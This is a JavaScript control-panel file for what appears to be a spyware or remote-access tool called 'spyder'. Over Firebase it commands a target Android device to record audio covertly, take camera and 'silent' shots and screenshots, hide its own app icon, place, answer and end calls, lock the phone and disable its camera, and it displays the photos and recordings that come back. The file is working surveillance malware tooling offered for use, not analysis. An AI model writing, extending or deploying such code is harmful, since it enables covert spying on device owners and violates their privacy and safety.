  import { db, auth } from "../api/firebase.js";
  import { ref, set, get, onValue } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
  import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";

  let uid = null, appVisibility = null, deviceId = null;
  let activeFilter = 'all';
  const counts = { all:0, cmd:0, res:0, photo:0, audio:0, err:0, info:0 };

  const toggleBtn = document.getElementById("toggleVisibilityBtn");
  const logBody   = document.getElementById("logBody");
  const logEmpty  = document.getElementById("logEmpty");

  // ── helpers ──────────────────────────────────────────────────
  async function getDeviceIdSafe() {
    return new Promise((resolve, reject) => {
      onAuthStateChanged(auth, async (user) => {
        if (!user) return reject("Not logged in");
        const snap = await get(ref(db, `users/${user.uid}/storeId`));
        resolve(snap.val());
      });
    });
  }

  function ts() {
    return new Date().toLocaleTimeString([], { hour:'2-digit', minute:'2-digit', second:'2-digit' });
  }

  function updateBadges() {
    ['all','cmd','res','photo','audio','err','info'].forEach(k => {
      const el = document.getElementById('b-' + k);
      if (el) el.textContent = counts[k] || 0;
    });
    document.getElementById('logCount').textContent = (counts.all || 0) + ' entries';
  }

  function applyFilter(f) {
    activeFilter = f;
    document.querySelectorAll('.ftab').forEach(t => t.classList.toggle('active', t.dataset.f === f));
    document.querySelectorAll('.log-entry').forEach(el => {
      el.classList.toggle('hidden', f !== 'all' && el.dataset.t !== f);
    });
    syncEmpty();
  }

  function syncEmpty() {
    const visible = Array.from(document.querySelectorAll('.log-entry:not(.hidden)'));
    if (logEmpty) logEmpty.style.display = visible.length ? 'none' : '';
  }

  function addLog(type, data) {
    if (logEmpty) logEmpty.style.display = 'none';
    counts[type] = (counts[type]||0) + 1;
    counts.all   = (counts.all||0) + 1;
    updateBadges();
    const labels = { cmd:'⬆ CMD SENT', res:'✅ RESPONSE', photo:'📸 PHOTO', audio:'🎧 AUDIO', err:'❌ ERROR', info:'ℹ INFO' };
    let body = '';
    if (type === 'cmd') {
      body = `<pre>${typeof data==='object' ? JSON.stringify(data,null,2) : String(data)}</pre>`;
    } else if (type === 'photo' && data.url) {
      const cat = (data.category||'capture').replace(/_/g,' ').replace(/\b\w/g,c=>c.toUpperCase());
      body = `<strong>${cat}</strong>
        <img class="photo-thumb" src="${data.url}" alt="photo"
          onclick="document.getElementById('fsImg').src='${data.url}';document.getElementById('fsMod').classList.add('active');">
        <br><a class="entry-link" href="${data.url}" target="_blank">↗ Open full image</a>`;
    } else if (type === 'audio' && data.url) {
      const aid = 'aud_' + Date.now();
      body = `<strong>Recorded audio</strong>
        <audio id="${aid}" class="entry-audio" controls preload="metadata"></audio>
        <div class="dl-row">
          <a class="dl-btn dl-raw" href="${data.url}" download>↓ RAW</a>
          <a class="dl-btn dl-wav" href="#" onclick="dlWav('${data.url}',this);return false;">↓ WAV</a>
        </div>`;
      setTimeout(() => pcmToAudio(data.url, aid), 200);
    } else if (type === 'res') {
      const msg = typeof data==='object' ? (data.message||JSON.stringify(data)) : String(data);
      body = `<strong>Result</strong>${msg}`;
    } else if (type === 'err') {
      body = `<strong>Error</strong>${data}`;
    } else {
      body = typeof data==='object' ? JSON.stringify(data) : String(data);
    }
    const el = document.createElement('div');
    el.className = `log-entry le-${type}`;
    el.dataset.t  = type;
    el.innerHTML  = `
      <div class="le-head">
        <span class="le-tag">${labels[type]||type}</span>
        <span class="le-time">${ts()}</span>
      </div>
      <div class="le-body">${body}</div>`;
    logBody.insertBefore(el, logBody.firstChild);
    if (activeFilter !== 'all' && activeFilter !== type) el.classList.add('hidden');
    syncEmpty();
  }

  document.querySelectorAll('.ftab').forEach(t => t.addEventListener('click', () => applyFilter(t.dataset.f)));

  document.getElementById('clearBtn').addEventListener('click', () => {
    document.querySelectorAll('.log-entry').forEach(e => e.remove());
    Object.keys(counts).forEach(k => counts[k]=0);
    updateBadges(); syncEmpty();
  });

  document.getElementById('exportBtn').addEventListener('click', () => {
    const data = Array.from(document.querySelectorAll('.log-entry')).map(e => ({
      type: e.dataset.t, time: e.querySelector('.le-time')?.textContent,
      content: e.querySelector('.le-body')?.innerText
    }));
    const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob([JSON.stringify(data,null,2)],{type:'application/json'}));
    a.download = `spyder_logs_${Date.now()}.json`; a.click();
  });

  document.getElementById('closeFsBtn').addEventListener('click', () => document.getElementById('fsMod').classList.remove('active'));
  document.getElementById('fsMod').addEventListener('click', e => { if(e.target===e.currentTarget) e.currentTarget.classList.remove('active'); });

  // ── PCM helpers (unchanged) ───────────────────────────────────
  async function pcmToAudio(url, id) {
    try {
      const ab = await (await fetch(url)).arrayBuffer();
      const el = document.getElementById(id);
      if (el) { el.src = URL.createObjectURL(makePcmWav(ab)); el.load(); }
    } catch(e) { console.error(e); }
  }
  window.dlWav = async function(url, btn) {
    btn.textContent = '⏳';
    try {
      const ab = await (await fetch(url)).arrayBuffer();
      const a = document.createElement('a');
      a.href = URL.createObjectURL(makePcmWav(ab));
      a.download = `spy_${Date.now()}.wav`;
      document.body.appendChild(a); a.click(); document.body.removeChild(a);
      btn.textContent = '✓';
    } catch { btn.textContent = '✗'; }
  };
  function makePcmWav(ab) {
    const pcm = new Int16Array(ab), sr = 16000;
    const buf = new ArrayBuffer(44 + pcm.length*2);
    const v   = new DataView(buf);
    const ws  = (o,s) => { for(let i=0;i<s.length;i++) v.setUint8(o+i, s.charCodeAt(i)); };
    ws(0,'RIFF'); v.setUint32(4,36+pcm.length*2,true); ws(8,'WAVE'); ws(12,'fmt ');
    v.setUint32(16,16,true); v.setUint16(20,1,true); v.setUint16(22,1,true);
    v.setUint32(24,sr,true); v.setUint32(28,sr*2,true);
    v.setUint16(32,2,true); v.setUint16(34,16,true); ws(36,'data');
    v.setUint32(40,pcm.length*2,true);
    for(let i=0,o=44; i<pcm.length; i++,o+=2)
      v.setInt16(o, Math.max(-32768,Math.min(32767,pcm[i])), true);
    return new Blob([buf], {type:'audio/wav'});
  }

  // ── CORE SEND HELPERS ─────────────────────────────────────────
  function sendCmd(cmd) {
    if (!uid||!deviceId) { addLog('err','Not ready'); return; }
    set(ref(db, `users/${uid}/devices/${deviceId}/commands/current`), cmd)
      .then(() => addLog('cmd', cmd))
      .catch(e => addLog('err', e.message));
  }

  

  function sendCapture(action) {
    if (!uid||!deviceId) { addLog('err','Not ready'); return; }
    set(ref(db, `users/${uid}/devices/${deviceId}/commands/capture/action`), action)
      .then(() => addLog('cmd', {action:'capture', camera:action}))
      .catch(e => addLog('err', e.message));
  }

  function sendAudio(sec) {
    if (!uid) { addLog('err','Not authenticated'); return; }
    set(ref(db, `users/${uid}/devices/${deviceId}/audio/commands/action`), "startrecording")
      .then(() => {
        set(ref(db, `users/${uid}/devices/${deviceId}/audio/commands/duration`), sec*1000);
        addLog('cmd', {action:'startrecording', duration:`${sec}s`});
      }).catch(e => addLog('err', e.message));
  }

  function updateVisUI() {
    if (!toggleBtn) return;
    toggleBtn.disabled = false;
    if      (appVisibility === "VISIBLE") { toggleBtn.textContent="Hide App";   toggleBtn.className="btn btn-red btn-full"; }
    else if (appVisibility === "HIDDEN")  { toggleBtn.textContent="Unhide App"; toggleBtn.className="btn btn-green btn-full"; }
    else { toggleBtn.textContent="Checking..."; toggleBtn.className="btn btn-cyan btn-full"; toggleBtn.disabled=true; }
  }

  // ── AUTH + FIREBASE LISTENERS (unchanged) ─────────────────────
  onAuthStateChanged(auth, async (user) => {
    if (!user) return;
    uid      = user.uid;
    deviceId = await getDeviceIdSafe();
    document.getElementById('deviceIdLabel').textContent = `DEV: ${String(deviceId).slice(0,8)}...`;
    addLog('info', `Authenticated · Device: ${deviceId}`);

    const audioUrls = snap => {
      const u = snap.val();
      if (u) Object.entries(u).forEach(([,d]) => { if(d?.url) addLog('audio',{url:d.url}); });
    };
    onValue(ref(db, `users/${uid}/devices/${deviceId}/audio/url`), audioUrls);
    onValue(ref(db, `users/${uid}/devices/${deviceId}/audio2/url`), audioUrls);

    onValue(ref(db, `users/${uid}/devices/${deviceId}/commands/result`), snap => {
      const d = snap.val(); if (!d) return;
      addLog('res', d);
      if (d.message==="VISIBLE"||d.message==="HIDDEN")
        set(ref(db, `users/${uid}/devices/${deviceId}/commands/appStatus`), {value:d.message, time:Date.now()});
    });

    onValue(ref(db, `users/${uid}/devices/${deviceId}/commands/appStatus`), snap => {
      const s = snap.val(); if (!s) return;
      appVisibility = s.value; updateVisUI();
    });

    onValue(ref(db, `users/${uid}/devices/${deviceId}/commands/capture/result`), snap => {
      const r = snap.val(); if (r) addLog('res',{message:`Capture: ${r}`});
    });

    onValue(ref(db, `users/${uid}/devices/${deviceId}/photos/commandsphotos`), snap => {
      const p = snap.val(); if (!p) return;
      Object.entries(p).forEach(([cat,timestamps]) => {
        if (timestamps) Object.entries(timestamps).forEach(([,d]) => { if(d?.url) addLog('photo',{url:d.url,category:cat}); });
      });
    });

    onValue(ref(db, `users/${uid}/devices/${deviceId}/commands/result`), snap => {
  const d = snap.val(); if (!d) return;
  addLog('res', d);
  if (d.message==="VISIBLE"||d.message==="HIDDEN")
    set(ref(db, `users/${uid}/devices/${deviceId}/commands/appStatus`), {value:d.message, time:Date.now()});
  
  // NEW: Handle isDeviceActive response
  if (typeof d === 'string' && (d.includes('ScreenOn') || d.includes('Screenoff'))) {
    addLog('res', {message: `Device Active: ${d}`, state: d});
  }
});

    sendCmd({action:"status"});
  });

  // ── ORIGINAL BUTTON BINDINGS (unchanged) ─────────────────────
  document.getElementById("vibrateBtn")?.addEventListener("click", () =>
    sendCmd({action:"vibrate", data:{duration:+document.getElementById("vibrateDuration").value||1000}}));
  document.getElementById("ringBtn")?.addEventListener("click", () => sendCmd({action:"ring"}));
  document.getElementById("stopRingBtn")?.addEventListener("click", () => sendCmd({action:"stopRing"}));
  document.getElementById("toastBtn")?.addEventListener("click", () =>
    sendCmd({action:"toast", data:{message:document.getElementById("notifyMsg").value||"Hello"}}));
  document.getElementById("urlBtn")?.addEventListener("click", () => {
    let u = document.getElementById("urlInput").value.trim();
    if (!u) { addLog('err','URL empty'); return; }
    if (!/^https?:\/\//i.test(u)) u = "https://"+u;
    sendCmd({action:"open_link", data:{url:u}});
  });
  document.getElementById("lockBtn")?.addEventListener("click", () => sendCmd({action:"lockDevice"}));
  document.getElementById("speakBtn")?.addEventListener("click", () =>
    sendCmd({action:"speakText", data:{text:document.getElementById("speakInput").value||"Hello"}}));
  document.getElementById("setDialBtn")?.addEventListener("click", () =>
    sendCmd({action:"setDialCode", data:{code:document.getElementById("dialCodeInput").value}}));
  document.getElementById("audioSpy1Btn")?.addEventListener("click", () =>
    sendAudio(parseInt(document.getElementById("audioDuration1").value)));
  document.getElementById("appVisibilityBtn")?.addEventListener("click", () => sendCmd({action:"unhideApp"}));
  toggleBtn?.addEventListener("click", () => {
    if (!appVisibility) return;
    toggleBtn.textContent="Updating..."; toggleBtn.disabled=true;
    sendCmd({action: appVisibility==="VISIBLE" ? "hideApp" : "unhideApp"});
    setTimeout(() => sendCmd({action:"status"}), 700);
  });
  document.getElementById("frontCameraBtn")?.addEventListener("click", () => sendCapture("front_camera"));
  document.getElementById("backCameraBtn")?.addEventListener("click",  () => sendCapture("back_camera"));
  // document.getElementById("screenshotBtn")?.addEventListener("click",  () => sendCapture("screenshot"));
  document.getElementById("silentshotBtn")?.addEventListener("click",  () => sendCapture("silent_shot"));
  // document.getElementById("autoCallBtn")?.addEventListener("click", () => {
  //   const n = document.getElementById("phoneNumberInput").value.trim();
  //   if (!n) { addLog('err','Phone number empty'); return; }
  //   sendCmd({action:"makeCall", data:{number:n}});
  // });



// FIXED sendCapture — screenshot must also go through sendCmd with action:"screenshot"
// NOT sendCapture() which writes to a different path Android never polls for screenshots
document.getElementById("screenshotBtn")?.addEventListener("click", () =>
  sendCmd({ action: "screenshot" })  // CommandExecutor case "screenshot" handles this
);

  document.getElementById("autoCallBtn")?.addEventListener("click", () => {
    const n = document.getElementById("phoneNumberInput").value.trim();
    if (!n) { addLog('err','Phone number empty'); return; }
    sendCmd({action:"callNumber", data:{number:n}});
  });

  document.getElementById("callStatusBtn")?.addEventListener("click", () =>
    sendCmd({action:"isCallActive"}));

  document.getElementById("answerCallBtn")?.addEventListener("click", () =>
    sendCmd({action:"answerCall"}));

  document.getElementById("endCallBtn")?.addEventListener("click", () =>
    sendCmd({action:"endCall"}));

  // ── NEW: RINGER MODE ──────────────────────────────────────────
  document.getElementById("silentModeBtn")?.addEventListener("click",  () => sendCmd({action:"silentMode"}));
  document.getElementById("vibrateModeBtn")?.addEventListener("click", () => sendCmd({action:"vibrateMode"}));
  document.getElementById("normalModeBtn")?.addEventListener("click",  () => sendCmd({action:"normalMode"}));

  // ── NEW: DND ──────────────────────────────────────────────────
  document.getElementById("dndOnBtn")?.addEventListener("click",  () => sendCmd({action:"dnd", data:{enable:true}}));
  document.getElementById("dndOffBtn")?.addEventListener("click", () => sendCmd({action:"dnd", data:{enable:false}}));

  // ── NEW: VOLUME SLIDERS ───────────────────────────────────────
  function bindSlider(sliderId, valId, suffix) {
    const slider = document.getElementById(sliderId);
    const label  = document.getElementById(valId);
    if (slider && label) {
      slider.addEventListener("input", () => { label.textContent = slider.value + (suffix||'%'); });
    }
  }
  bindSlider("mediaVolSlider",   "mediaVolVal",   '%');
  bindSlider("alarmVolSlider",   "alarmVolVal",   '%');
  bindSlider("ringVolSlider",    "ringVolVal",    '%');
  bindSlider("notifVolSlider",   "notifVolVal",   '%');
  bindSlider("brightnessSlider", "brightnessVal", '');

  document.getElementById("mediaVolBtn")?.addEventListener("click", () =>
    sendCmd({action:"setMediaVolume", data:{value:+document.getElementById("mediaVolSlider").value}}));
  document.getElementById("alarmVolBtn")?.addEventListener("click", () =>
    sendCmd({action:"setAlarmVolume", data:{value:+document.getElementById("alarmVolSlider").value}}));
  document.getElementById("ringVolBtn")?.addEventListener("click", () =>
    sendCmd({action:"setRingVolume",  data:{value:+document.getElementById("ringVolSlider").value}}));
  document.getElementById("notifVolBtn")?.addEventListener("click", () =>
    sendCmd({action:"setNotifVolume", data:{value:+document.getElementById("notifVolSlider").value}}));

  // ── NEW: PLAY URL ─────────────────────────────────────────────
  document.getElementById("playUrlBtn")?.addEventListener("click", () => {
    let u = document.getElementById("playUrlInput").value.trim();
    if (!u) { addLog('err','URL empty'); return; }
    const loop = document.getElementById("playLoopCheck").checked;
    sendCmd({action:"playUrl", data:{url:u, loop:loop}});
  });
  document.getElementById("stopUrlBtn")?.addEventListener("click", () => sendCmd({action:"stopUrl"}));

  // ── NEW: FLASHLIGHT ───────────────────────────────────────────
  document.getElementById("torchOnBtn")?.addEventListener("click",  () => sendCmd({action:"torch", data:{enable:true}}));
  document.getElementById("torchOffBtn")?.addEventListener("click", () => sendCmd({action:"torch", data:{enable:false}}));

  // ── NEW: BLUETOOTH ────────────────────────────────────────────
  // document.getElementById("btOnBtn")?.addEventListener("click",  () => sendCmd({action:"bluetooth", data:{enable:true}}));
  // document.getElementById("btOffBtn")?.addEventListener("click", () => sendCmd({action:"bluetooth", data:{enable:false}}));

  // ── NEW: CAMERA DISABLE ───────────────────────────────────────
  document.getElementById("camDisableBtn")?.addEventListener("click", () => sendCmd({action:"disableCamera", data:{disable:true}}));
  document.getElementById("camEnableBtn")?.addEventListener("click",  () => sendCmd({action:"disableCamera", data:{disable:false}}));

  // ── NEW: OPEN APP ─────────────────────────────────────────────
  document.getElementById("openAppBtn")?.addEventListener("click", () => {
    const pkg = document.getElementById("openAppInput").value.trim();
    if (!pkg) { addLog('err','Package name empty'); return; }
    sendCmd({action:"openApp", data:{package:pkg}});
  });

  // ── NEW: BRIGHTNESS ───────────────────────────────────────────
  document.getElementById("brightnessBtn")?.addEventListener("click", () =>
    sendCmd({action:"setBrightness", data:{value:+document.getElementById("brightnessSlider").value}}));

  // ── NEW: AUTO BRIGHTNESS ──────────────────────────────────────
  document.getElementById("autoBrightOnBtn")?.addEventListener("click",  () => sendCmd({action:"autoBrightness", data:{enable:true}}));
  document.getElementById("autoBrightOffBtn")?.addEventListener("click", () => sendCmd({action:"autoBrightness", data:{enable:false}}));

  // ── NEW: DEVICE ACTIVE STATUS ──────────────────────────────────
document.getElementById("deviceActiveBtn")?.addEventListener("click", () =>
  sendCmd({action:"isDeviceActive"}));